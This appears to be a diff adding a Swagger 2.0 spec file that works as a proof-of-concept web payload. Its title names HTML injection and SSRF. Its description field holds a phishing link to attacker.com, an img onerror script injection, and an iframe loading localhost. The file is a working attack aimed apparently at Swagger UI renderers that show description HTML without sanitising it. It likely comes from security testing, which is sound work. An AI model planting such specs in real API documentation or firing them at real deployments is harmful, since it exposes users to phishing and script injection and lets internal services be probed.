@@ -1,0 +1,5 @@
+swagger: '2.0'
+info:
+  title: html-injection + SSRF
+  description: <a href="http://attacker.com/fake-page.html">POC ... Click on me</a><img src=x onerror=alert(origin) /><iframe src="http://localhost/" width="800" height="600"></iframe>
+  version: production
